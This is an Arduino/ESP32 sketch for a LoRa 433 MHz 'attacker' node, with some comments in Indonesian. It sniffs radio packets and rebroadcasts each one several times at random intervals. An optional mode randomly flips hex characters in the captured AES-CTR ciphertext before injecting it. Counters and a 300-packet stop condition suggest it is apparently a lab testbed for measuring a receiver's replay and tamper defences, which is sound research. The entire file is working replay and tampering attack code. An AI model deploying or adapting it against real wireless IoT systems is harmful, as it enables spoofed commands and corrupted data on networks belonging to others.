#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

// =====================================
// PARAMETER
// =====================================
const uint32_t EXPECTED = 300;
const unsigned long TIMEOUT_MS = 30000;

// =====================================
// ATTACK MODE
// =====================================
#define MODE_REPLAY_ONLY     0
#define MODE_REPLAY_TAMPER   1

int ATTACK_MODE =
    // MODE_REPLAY_TAMPER;
    MODE_REPLAY_ONLY;

// =====================================
// METRICS
// =====================================
uint32_t sniffedCount   = 0;
uint32_t replayedCount  = 0;
uint32_t tamperedCount  = 0;

unsigned long lastRecvTime = 0;
bool started = false;
bool done = false;

// =====================================
// RANDOM CIPHERTEXT TAMPER
// AES CTR realistic attack
// flip random hex chars
// =====================================
String tamperCipher(
  String cipher
) {

  String tampered =
      cipher;

  // jumlah karakter yg dirusak
  int flips =
      random(1, 4);

  for (
    int i = 0;
    i < flips;
    i++
  ) {

    int pos =
        random(
          0,
          tampered.length()
        );

    char hexChars[] =
        "0123456789ABCDEF";

    char randomHex =
        hexChars[
          random(0,16)
        ];

    tampered.setCharAt(
      pos,
      randomHex
    );
  }

  return tampered;
}

// =====================================
// SETUP
// =====================================
void setup() {

  Serial.begin(115200);

  randomSeed(
    micros()
  );

  SPI.begin(
    18,
    19,
    23,
    SS
  );

  LoRa.setPins(
    SS,
    RST,
    DIO0
  );

  if (
    !LoRa.begin(
      433E6
    )
  ) {

    Serial.println(
      "LoRa init FAILED!"
    );

    while (1);
  }

  LoRa.setSpreadingFactor(
    7
  );

  LoRa.setSignalBandwidth(
    125E3
  );

  LoRa.setCodingRate4(5);

  LoRa.receive();

  Serial.println(
    "===================="
  );

  Serial.println(
    "ATTACKER READY"
  );

  if (
    ATTACK_MODE
    ==
    MODE_REPLAY_ONLY
  ) {

    Serial.println(
      "MODE: REPLAY ONLY"
    );
  }
  else {

    Serial.println(
      "MODE: REPLAY + TAMPER"
    );
  }

  Serial.println(
    "===================="
  );
}

// =====================================
// LOOP
// =====================================
void loop() {

  if (done)
    return;

  int packetSize =
      LoRa.parsePacket();

  if (!packetSize)
    return;

  started = true;

  lastRecvTime =
      millis();

  sniffedCount++;

  String data =
      "";

  while (
    LoRa.available()
  ) {

    data +=
      (char)
      LoRa.read();
  }

  // =====================================
  // FILTER PACKET
  // =====================================

  // skip empty packet
  if (
    data.length()
    == 0
  ) {

    LoRa.receive();
    return;
  }

  // skip ACK dari receiver
  if (
    data.startsWith(
      "ACK,"
    )
  ) {

    Serial.print("================================");
    Serial.println("");

    LoRa.receive();
    return;
  }

  // =====================================
  // SNIFF LOG
  // =====================================
  Serial.print(
    "[SNIFF] "
  );

  Serial.println(
    data
  );

  // =====================================
  // RANDOM REPLAY COUNT
  // =====================================
  int replayTimes =
      random(1,5);

  Serial.print(
    "[ATTACK] Replay x"
  );

  Serial.println(
    replayTimes
  );

  // switch ke TX
  LoRa.idle();

  for (
    int i = 0;
    i < replayTimes;
    i++
  ) {

    // =====================================
    // TOTAL ATTACK WINDOW
    // max sebelum paket baru datang
    // =====================================
    int totalAttackWindow =
        random(
          300,
          4000
        );

    // delay per replay
    int attackDelay =
        totalAttackWindow
        /
        replayTimes;

    delay(
      attackDelay
    );

    String forgedPayload;

    // =========================
    // MODE SWITCH
    // =========================
    if (
      ATTACK_MODE
      ==
      MODE_REPLAY_ONLY
    ) {

      forgedPayload =
          data;

      Serial.print(
        "[REPLAY "
      );

      Serial.print(
        i + 1
      );

      Serial.print(
        "/"
      );

      Serial.print(
        replayTimes
      );

      Serial.print(
        "] "
      );
    }
    else {

      forgedPayload =
          tamperCipher(
            data
          );

      tamperedCount++;

      Serial.print(
        "[TAMPER "
      );

      Serial.print(
        i + 1
      );

      Serial.print(
        "/"
      );

      Serial.print(
        replayTimes
      );

      Serial.print(
        "] "
      );
    }

    replayedCount++;

    Serial.print(
      "interval="
    );

    Serial.print(
      attackDelay
    );

    Serial.print(
      "ms | total="
    );

    Serial.print(
      totalAttackWindow
    );

    Serial.print(
      "ms -> "
    );

    Serial.println(
      forgedPayload
    );

    // =========================
    // SEND FORGED PACKET
    // =========================
    LoRa.beginPacket();

    LoRa.print(
      forgedPayload
    );

    LoRa.endPacket();
  }

  // balik RX
  LoRa.receive();

  // =====================================
  // STOP CONDITION
  // =====================================
  if (
    sniffedCount
    >=
    EXPECTED
  ) {

    done = true;
  }

  if (
    started
    &&
    (
      millis()
      -
      lastRecvTime
      >
      TIMEOUT_MS
    )
  ) {

    done = true;
  }
}